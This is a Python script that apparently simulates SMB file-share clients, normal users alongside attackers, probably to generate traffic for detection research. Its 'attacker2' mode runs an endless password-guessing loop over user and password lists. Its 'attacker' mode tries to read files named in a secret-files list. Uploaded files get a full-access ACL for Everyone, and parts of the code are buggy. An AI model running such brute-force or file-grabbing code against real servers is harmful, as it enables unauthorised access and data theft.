import io
import os
import time
import uuid
from argparse import ArgumentParser

from smbprotocol.create_contexts import CreateContextName, \
    SMB2CreateContextRequest, SMB2CreateQueryMaximalAccessRequest
from smbprotocol.security_descriptor import AccessAllowedAce, AccessMask, \
    AclPacket, SDControl, SIDPacket, SMB2CreateSDBuffer
from smbprotocol.structure import FlagField
from smbprotocol.connection import Connection
from smbprotocol.session import Session
from smbprotocol.open import CreateDisposition, CreateOptions, \
    DirectoryAccessMask, FileAttributes, FileInformationClass, \
    FilePipePrinterAccessMask, ImpersonationLevel, Open, ShareAccess
from smbprotocol.tree import TreeConnect
import random


TYPES = ['usual', 'attacker', 'attacker2']
USUAL = 0
ATTACKER = 1
ATTACKER2 = 2
DOWNLOAD_FILE = 'download_file'
UPLOAD_FILE = 'upload_file'
DELETE_FILE = 'delete_file'
ACTIONS = [UPLOAD_FILE, DELETE_FILE, DOWNLOAD_FILE]

TRY_DOWNLOAD_FILE = 'try_download_file'
ACTIONS_ATTACK = ACTIONS + [TRY_DOWNLOAD_FILE]

PREFIX = 'gen_'


class Crawler:

    share = None
    dirs = None
    client = None
    connection = None

    def __init__(self, share, type=TYPES[0], user_name='', password='', system_name='', ip='', min=0, max=60, randomize=True):
        print('Container type: {}'.format(type))
        if type == TYPES[USUAL]:
            self.actions = ACTIONS
        elif type == TYPES[ATTACKER2]:

            with open('users.txt') as f:
                users = f.readlines()
                users = [x.strip() for x in users]

            with open('passwords.txt') as f:
                passwords = f.readlines()
                passwords = [x.strip() for x in passwords] 
            print('Starting attack.')
            while True:
                user = random.choice(users)
                password = random.choice(passwords)
                print('Attacking with {} {}'.format(user, password))
                try:
                    self.init_client(user, password, system_name, ip, min, max, randomize)
                except:
                    print('Connection attack failed.')
                time.sleep(5)

        else:
            self.actions = ACTIONS_ATTACK
        
        self.init_client(user_name, password, system_name, ip, min, max, randomize)

        max_req = SMB2CreateContextRequest()
        max_req['buffer_name'] = \
            CreateContextName.SMB2_CREATE_QUERY_MAXIMAL_ACCESS_REQUEST
        max_req['buffer_data'] = SMB2CreateQueryMaximalAccessRequest()

        # create security buffer that sets the ACL for everyone to have read access
        everyone_sid = SIDPacket()
        everyone_sid.from_string("S-1-1-0")

        ace = AccessAllowedAce()
        ace['mask'] = AccessMask.GENERIC_ALL
        ace['sid'] = everyone_sid

        acl = AclPacket()
        acl['aces'] = [ace]

        sec_desc = SMB2CreateSDBuffer()
        sec_desc['control'].set_flag(SDControl.SELF_RELATIVE)
        sec_desc.set_dacl(acl)
        sd_buffer = SMB2CreateContextRequest()
        sd_buffer['buffer_name'] = CreateContextName.SMB2_CREATE_SD_BUFFER
        sd_buffer['buffer_data'] = sec_desc

        self.create_contexts = [
            max_req,
            sd_buffer
        ]

        self.share = r"\\%s\%s" % ip, share

        with open('secret_files.txt', 'r') as file:
            content = file.readlines()
            self.secret_files = [x.strip() for x in content]

    def init_client(self, user_name, password, system_name, ip, min, max, randomize):
        self.connection = Connection(uuid.uuid4(), ip, 445)
        self.connection.connect()
        print('Creating client.')
        session = Session(self.connection, user_name, password)
        session.connect()
        print('Client created.')
        self.client = session

    def list_directory(self, path):

        tree = TreeConnect(self.client)
        tree.connect()
        dir_open = Open(tree, path)
        compound_messages = [
                        dir_open.query_directory("*", FileInformationClass.FILE_NAMES_INFORMATION, send=False),
                        dir_open.close(False, send=False)
        ]
        requests = self.connection.send_compound([x[0] for x in compound_messages], self.client.session_id,
                                                 tree.tree_connect_id)
        responses = []
        for i, request in enumerate(requests):
            response = compound_messages[i][1](request)
            responses.append(response)

        dir_files = []
        for dir_file in responses[1]:
            dir_files.append(dir_file['file_name'].get_value().decode('utf-16-le'))
        return dir_files

    def upload_file(self, directory, filename, file):
        max_req = SMB2CreateContextRequest()
        max_req['buffer_name'] = \
            CreateContextName.SMB2_CREATE_QUERY_MAXIMAL_ACCESS_REQUEST
        max_req['buffer_data'] = SMB2CreateQueryMaximalAccessRequest()

        # create security buffer that sets the ACL for everyone to have read access
        everyone_sid = SIDPacket()
        everyone_sid.from_string("S-1-1-0")

        ace = AccessAllowedAce()
        ace['mask'] = AccessMask.GENERIC_ALL
        ace['sid'] = everyone_sid

        acl = AclPacket()
        acl['aces'] = [ace]

        sec_desc = SMB2CreateSDBuffer()
        sec_desc['control'].set_flag(SDControl.SELF_RELATIVE)
        sec_desc.set_dacl(acl)
        sd_buffer = SMB2CreateContextRequest()
        sd_buffer['buffer_name'] = CreateContextName.SMB2_CREATE_SD_BUFFER
        sd_buffer['buffer_data'] = sec_desc

        create_contexts = [
            max_req,
            sd_buffer
        ]

        tree = TreeConnect(self.client)
        tree.connect()
        file_open = Open(tree, directory + '\\' + filename)
        open_info = file_open.create(
            ImpersonationLevel.Impersonation,
            FilePipePrinterAccessMask.GENERIC_READ |
            FilePipePrinterAccessMask.GENERIC_WRITE,
            FileAttributes.FILE_ATTRIBUTE_NORMAL,
            ShareAccess.FILE_SHARE_READ | ShareAccess.FILE_SHARE_WRITE,
            CreateDisposition.FILE_OVERWRITE_IF,
            CreateOptions.FILE_NON_DIRECTORY_FILE,
            create_contexts
        )

        # as the raw structure 'maximal_access' is an IntField, we create our own
        # flag field, set the value and get the human readble string
        max_access = FlagField(
            size=4,
            flag_type=FilePipePrinterAccessMask,
            flag_strict=False
        )
        max_access.set_value(open_info[0]['maximal_access'].get_value())

        # write to a file
        file_open.write(file, 0)
        file_open.close(False)

    def download_file(self, file):

        tree = TreeConnect(self.client)
        tree.connect()
        file_open = Open(tree, file)

        file_open.read(0, 100*1024*1024, min_length=1)

    def delete_file(self, file):
        tree = TreeConnect(self.client)
        tree.connect()
        file_open = Open(tree, file)
        delete_msgs = [
            file_open.create(
                ImpersonationLevel.Impersonation,
                FilePipePrinterAccessMask.GENERIC_READ |
                FilePipePrinterAccessMask.DELETE,
                FileAttributes.FILE_ATTRIBUTE_NORMAL,
                0,
                CreateDisposition.FILE_OPEN,
                CreateOptions.FILE_NON_DIRECTORY_FILE |
                CreateOptions.FILE_DELETE_ON_CLOSE,
                send=False
            ),
            file_open.close(False, send=False)
        ]
        requests = self.connection.send_compound([x[0] for x in delete_msgs], self.client.session_id,
                                                 tree.tree_connect_id, related=True)
        responses = []
        for i, request in enumerate(requests):
            response = delete_msgs[i][1](request)
            responses.append(response)

    def start(self):
        print('Starting crawling.')
        self.dirs = self.list_directory(path='/')
        to_remove = []
        for folder in self.dirs:
            if folder.filename == '.':
                to_remove.append(folder)
            elif folder.filename == '..':
                to_remove.append(folder)
            elif not folder.isDirectory:
                to_remove.append(folder)
        for remove in to_remove:
            self.dirs.remove(remove)

        while True:
            action = random.choice(self.actions)
            if action == DOWNLOAD_FILE:
                file = self.select_file()
                print('Downloading file.')
                self.download_file(file)
            elif action == UPLOAD_FILE:
                directory = self.select_directory()
                f = io.BytesIO(os.urandom(200 * 1024))
                file_name = PREFIX + str(uuid.uuid4()) + '.txt'
                print('Uploading file.')
                self.upload_file(directory.filename, file_name, f)
            elif action == DELETE_FILE:
                print('Deleting file.')
                self.delete_random_file()
            elif action == TRY_DOWNLOAD_FILE:
                print('Attack downloading file.')
                self.try_download_file()

    def select_directory(self):
        directory = random.choice(self.dirs)
        return directory

    def select_file(self):
        directory = self.select_directory()
        files = self.list_directory(directory.filename)
        random.shuffle(files)
        for file in files:
            if not file.isDirectory:
                return directory.filename + '\\' + file.filename

    def delete_random_file(self):
        directory = self.select_directory()
        files = self.list_directory(directory.filename)
        random.shuffle(files)
        for file in files:
            if file.filename.startswith(PREFIX):
                self.delete_file(directory.filename + '\\' + file.filename)

    def try_download_file(self):
        self.download_file(random.choice(self.secret_files))


def main():
    print('Starting')
    parser = ArgumentParser()
    parser.add_argument("-t", "--type",
                        dest="type",
                        choices=TYPES,
                        default='usual',
                        required=False,
                        help="Client type.")
    parser.add_argument("-r", "--random_interval",
                        dest="random",
                        default='True',
                        required=False,
                        type=bool,
                        help="Sets random backoff interval.")
    parser.add_argument("-m", "--min",
                        dest="min",
                        type=int,
                        default=1,
                        required=False,
                        help="Sets minimum backoff interval.")
    parser.add_argument("-n", "--maximum",
                        dest="max",
                        type=int,
                        default=60,
                        required=False,
                        help="Sets maximum backoff interval.")
    parser.add_argument("-s", "--share_name",
                        dest="share",
                        required=True,
                        help="Root directory on the server.")
    args = parser.parse_args()
    crawler = Crawler(args.share, args.type,os.environ['SMB_USER'], os.environ['PASSWORD'], os.environ['SMB_HOSTNAME'], os.environ['IP'], max=args.max)
    crawler.start()


if __name__ == "__main__":
    main()

